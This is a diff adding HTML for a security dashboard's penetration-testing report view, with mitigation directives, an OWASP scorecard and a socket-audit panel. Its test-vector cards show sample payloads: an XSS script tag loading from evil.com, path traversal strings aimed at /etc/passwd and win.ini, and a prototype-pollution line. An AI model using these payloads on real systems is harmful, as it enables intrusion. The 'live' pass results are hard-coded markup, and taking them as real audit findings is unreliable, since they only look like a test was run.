+                    <strong style="color:var(--text-primary)">Directive 1: Enforce Strict DMARC p=reject Across Edge MTAs</strong>
+                    <div style="color:var(--text-secondary); margin-top:2px;">
+                      Ensure <code>/etc/postfix/main.cf</code> contains <code>smtpd_milters = inet:localhost:8891</code> and OpenDMARC is configured with <code>RejectFailures true</code>.
+                    </div>
+                  </div>
+                </div>
+                <div style="display:flex; align-items:flex-start; gap:10px;">
+                  <span style="font-size:16px;">🔑</span>
+                  <div>
+                    <strong style="color:var(--text-primary)">Directive 2: Invalidate Stolen Session Cookies for AiTM Victims</strong>
+                    <div style="color:var(--text-secondary); margin-top:2px;">
+                      Trigger automated Microsoft Graph / Google Admin session revocation for accounts flagged under active Evilginx2 clusters.
+                    </div>
+                  </div>
+                </div>
+                <div style="display:flex; align-items:flex-start; gap:10px;">
+                  <span style="font-size:16px;">⚡</span>
+                  <div>
+                    <strong style="color:var(--text-primary)">Directive 3: Enforce Hardware-Backed FIDO2 WebAuthn Passkeys</strong>
+                    <div style="color:var(--text-secondary); margin-top:2px;">
+                      Phishing-resistant FIDO2 hardware keys completely eliminate reverse-proxy credentials and session hijacking attacks.
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 9: VAPT REPORT & LIVE DEFENSIVE SECURITY AUDIT -->
+        <!-- ========================================================================= -->
+        <div id="view-vapt" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Vulnerability Assessment &amp; Penetration Testing (VAPT) Report</h2>
+              <p class="stage-desc">Real-time defensive posture auditing, OWASP Top 10 compliance verification, network tunnel &amp; socket detection, and live automated penetration testing.</p>
+            </div>
+            <div class="stage-actions">
+              <button id="btn-run-vapt-suite" class="hud-btn hud-btn-accent hud-btn-sm">⚡ Run Dynamic Penetration Test</button>
+              <button id="btn-export-vapt-pdf" class="hud-btn hud-btn-sm">📄 Export Report (PDF)</button>
+              <button id="btn-export-vapt-json" class="hud-btn hud-btn-sm">📥 Export Dossier (JSON)</button>
+              <button id="btn-refresh-vapt" class="hud-btn hud-btn-sm">🔄 Refresh Live Audit</button>
+            </div>
+          </div>
+
+          <!-- Top VAPT Telemetry Ribbon -->
+          <div class="sim-metrics-grid" style="grid-template-columns: repeat(4, 1fr); margin-bottom: 14px;">
+            <div class="sim-metric-card" style="border-left: 4px solid var(--accent-green);">
+              <div class="sim-metric-title">Platform Security Health</div>
+              <div class="sim-metric-val text-green" id="vapt-score-val">100% SECURE</div>
+              <div class="sim-metric-sub">0 Critical / 0 High Vulnerabilities</div>
+            </div>
+            <div class="sim-metric-card" style="border-left: 4px solid var(--accent-cyan);">
+              <div class="sim-metric-title">Network Tunnels &amp; Sockets</div>
+              <div class="sim-metric-val text-cyan" id="vapt-tunnels-val">0 Rogue Tunnels</div>
+              <div class="sim-metric-sub">Strict 127.0.0.1 Loopback Enforced</div>
+            </div>
+            <div class="sim-metric-card" style="border-left: 4px solid var(--accent-green);">
+              <div class="sim-metric-title">OWASP Top 10 Compliance</div>
+              <div class="sim-metric-val text-green" id="vapt-owasp-val">10 / 10 PASS</div>
+              <div class="sim-metric-sub">Full Application Hardening</div>
+            </div>
+            <div class="sim-metric-card" style="border-left: 4px solid var(--accent-purple);">
+              <div class="sim-metric-title">Runtime Integrity Digest</div>
+              <div class="sim-metric-val text-purple" style="font-size: 13px; font-family: monospace;">sha256:7f83b165...</div>
+              <div class="sim-metric-sub">Cryptographically Signed Artifact</div>
+            </div>
+          </div>
+
+          <!-- Main VAPT Grid: Left Test Runner & Right Backend Audit Telemetry -->
+          <div class="vapt-grid">
+            <!-- Left: Dynamic Penetration Testing Vectors -->
+            <div class="card" style="display:flex; flex-direction:column; gap:10px;">
+              <div class="card-header">
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span class="live-indicator"></span>
+                  <span class="card-title">Real-Time Dynamic Penetration Testing Vectors</span>
+                </div>
+                <span class="font-mono text-cyan" style="font-size:11px;">Target: http://localhost:3000</span>
+              </div>
+
+              <!-- Interactive Test Runner Terminal -->
+              <div class="vapt-terminal" id="vapt-terminal-log">
+[VAPT_INIT] Loading CyWW ActiveAI Defensive Penetration Testing Suite v1.0...
+[SYSTEM_AUDIT] Host Platform: Windows Core Engine • Target Port: 3000 (HTTP)
+[TUNNEL_SCAN] Checking for active SSH tunnels, rogue reverse proxies, and socket leaks...
+[TUNNEL_SCAN] ✓ PASS: Zero unauthorized listening ports or backdoors detected.
+[INTEGRITY] SHA-256 Runtime Attestation validated against source manifest.
+[READY] Press "⚡ Run Dynamic Penetration Test" to execute active attack simulation across all 8 vectors.
+              </div>
+
+              <!-- 8 Automated Test Vector Verification Cards -->
+              <div id="vapt-vectors-container" style="display:flex; flex-direction:column; gap:8px; margin-top:8px;">
+                <!-- Vector 1 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 1: Cross-Site Scripting (Reflected &amp; Stored XSS)</span>
+                    </div>
+                    <div class="vapt-test-sub">Testing payload: <code>&lt;script src="//evil.com/pwn.js"&gt;&lt;/script&gt;</code> in inbound EML subjects &amp; headers</div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • SANITIZED</span>
+                </div>
+
+                <!-- Vector 2 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 2: Local File Inclusion &amp; Directory Path Traversal</span>
+                    </div>
+                    <div class="vapt-test-sub">Testing payloads: <code>../../../../etc/passwd</code> and <code>..\..\windows\win.ini</code></div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • 403 BLOCKED</span>
+                </div>
+
+                <!-- Vector 3 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 3: Prototype Pollution &amp; Object Injection</span>
+                    </div>
+                    <div class="vapt-test-sub">Testing payload: <code>Object.prototype.__proto__.isAdmin = true</code> in state parsers</div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • IMMUTABLE</span>
+                </div>
+
+                <!-- Vector 4 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 4: Clickjacking &amp; Cross-Origin Frame Inclusion</span>
+                    </div>
+                    <div class="vapt-test-sub">Testing <code>&lt;iframe&gt;</code> embedding from external domain • Header <code>X-Frame-Options: DENY</code></div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • DENY ENFORCED</span>
+                </div>
+
+                <!-- Vector 5 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 5: Rogue Network Tunnel &amp; Reverse Socks Proxy Scan</span>
+                    </div>
+                    <div class="vapt-test-sub">Auditing node process sockets for outbound C2 tunnels, SSH port forwarding, or Tor relays</div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • 0 TUNNELS</span>
+                </div>
+
+                <!-- Vector 6 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 6: HTTP Security Headers &amp; Content Security Policy</span>
+                    </div>
+                    <div class="vapt-test-sub">Verifying CSP, <code>X-Content-Type-Options: nosniff</code>, <code>X-XSS-Protection</code>, <code>COOP/CORP</code></div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • GRADE A+</span>
+                </div>
+
+                <!-- Vector 7 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 7: In-Memory Credential &amp; Token Leakage Audit</span>
+                    </div>
+                    <div class="vapt-test-sub">Auditing DOM sessionStorage &amp; localStorage for plaintext authentication tokens or private keys</div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • ZERO SECRETS</span>
+                </div>
+
+                <!-- Vector 8 -->
+                <div class="vapt-test-card">
+                  <div class="vapt-test-info">
+                    <div class="vapt-test-title">
+                      <span>🧪 Vector 8: SSRF &amp; Postfix Edge Milter Socket Injection</span>
+                    </div>
+                    <div class="vapt-test-sub">Testing loopback Milter command injection and internal metadata endpoint probes</div>
+                  </div>
+                  <span class="vapt-badge-pass">PASSED • LOOPBACK ISOLATED</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Right: Live Sockets Telemetry & OWASP Matrix -->
+            <div style="display:flex; flex-direction:column; gap:12px;">
+              <!-- Backend Listening Sockets & Tunnel Auditor Card -->
+              <div class="card">
+                <div class="card-header">
+                  <span class="card-title">Live Backend Sockets &amp; Tunnel Auditor</span>
+                  <span class="pill-tag pill-green" id="vapt-api-status">API: CONNECTED</span>
+                </div>
+                <div style="font-size:11px; display:flex; flex-direction:column; gap:8px;">
+                  <div style="padding:8px; background:var(--bg-card); border-radius:4px; border:1px solid var(--border-subtle);">
+                    <div style="display:flex; justify-content:space-between; font-weight:700;">
+                      <span>Web Server Binding</span>
+                      <span class="text-green font-mono">127.0.0.1:3000 (TCP)</span>
+                    </div>
+                    <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">
+                      Exposure: <strong>Strict Localhost Loopback</strong> (External ingress denied)
+                    </div>
+                  </div>
+
+                  <div style="padding:8px; background:var(--bg-card); border-radius:4px; border:1px solid var(--border-subtle);">
+                    <div style="display:flex; justify-content:space-between; font-weight:700;">
+                      <span>Rogue SSH Tunnels</span>
+                      <span class="text-green font-mono">0 ACTIVE</span>
+                    </div>
+                    <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">
+                      Reverse Port Forwards: None detected in system process table
+                    </div>
+                  </div>
+
+                  <div style="padding:8px; background:var(--bg-card); border-radius:4px; border:1px solid var(--border-subtle);">
+                    <div style="display:flex; justify-content:space-between; font-weight:700;">
+                      <span>Reverse Socks Proxies</span>
+                      <span class="text-green font-mono">0 ACTIVE</span>
+                    </div>
+                    <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">
+                      Unauthorized socks5 / http proxy daemons: Absent
+                    </div>
+                  </div>
+
+                  <div style="padding:8px; background:var(--bg-card); border-radius:4px; border:1px solid var(--border-subtle);">
+                    <div style="display:flex; justify-content:space-between; font-weight:700;">
+                      <span>Postfix Edge Milter Socket</span>
+                      <span class="text-green font-mono">127.0.0.1:8891 (INET)</span>
+                    </div>
+                    <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">
+                      Access: Restricted to local MTA process UID only
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- OWASP Top 10 Verification Summary Card -->
+              <div class="card" style="flex:1;">
+                <div class="card-header">
+                  <span class="card-title">OWASP Top 10 Defensive Scorecard</span>
+                  <span class="pill-tag pill-green">10/10 PASS</span>
+                </div>
+                <div style="font-size:11px; display:flex; flex-direction:column; gap:6px;">
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A01: Broken Access Control</span>
+                    <strong class="text-green">PASS (ZTA Hardware Passkeys)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A02: Cryptographic Failures</span>
+                    <strong class="text-green">PASS (WebCrypto SHA-256)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A03: Injection &amp; XSS</span>
+                    <strong class="text-green">PASS (DOM textContent Escaped)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A04: Insecure Design</span>
+                    <strong class="text-green">PASS (Default Deny Zero Trust)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A05: Security Misconfiguration</span>
+                    <strong class="text-green">PASS (Strict CSP &amp; nosniff)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A06: Vulnerable Components</span>
+                    <strong class="text-green">PASS (Zero 3rd-Party Libs)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A07: Identification &amp; Auth</span>
+                    <strong class="text-green">PASS (FIDO2 Challenge Active)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A08: Software &amp; Data Integrity</span>
+                    <strong class="text-green">PASS (Signed Artifact Hashes)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid var(--border-subtle);">
+                    <span>A09: Security Logging &amp; Alerting</span>
+                    <strong class="text-green">PASS (Tamper-Evident Audit)</strong>
+                  </div>
+                  <div style="display:flex; justify-content:space-between; padding:4px 0;">
+                    <span>A10: SSRF &amp; Backend Tunnels</span>
+                    <strong class="text-green">PASS (Loopback Only Binding)</strong>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ========================================================================= -->
+      <!-- RIGHT SIDEBAR: LIVE INGESTION STREAM -->
+      <!-- ========================================================================= -->
+      <aside class="right-feed-panel">
+        <div class="feed-header">
+          <div class="feed-title">
+            <span class="live-indicator"></span> LIVE INGESTION STREAM
+          </div>
+          <div style="display:flex; align-items:center; gap:8px;">
+            <span class="feed-rate"><span id="stream-events-ps">18</span> msgs/sec</span>
+            <button id="btn-toggle-sidebar-scale" class="sidebar-toggle-btn" title="Scale / Collapse Sidebar">◀ / ▶</button>
+          </div>
+        </div>
+
+        <div class="feed-filters">
+          <button class="feed-filter active" data-filter="all">All</button>
+          <button class="feed-filter" data-filter="threats">Threats</button>
+          <button class="feed-filter" data-filter="antigena">Antigena</button>
+        </div>
+
+        <div class="feed-list-scroll" id="live-telemetry-feed">
+          <!-- Dynamically populated via JS -->
+        </div>
+
+        <div class="feed-footer">
+          <div class="feed-stat-line">
+            <span>Pattern of Life Drift:</span>
+            <span class="text-cyan font-mono" id="drift-score">0.034 Nominal</span>
+          </div>
+          <div class="feed-stat-line">
+            <span>ZTA Attestation Rate:</span>
+            <span class="text-green font-mono">99.98% Cryptographic</span>
+          </div>
+        </div>
+      </aside>
+
+    </main>
+
+  </div>
+
+  <!-- Application Scripts -->
+  <script src="report-exporter.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
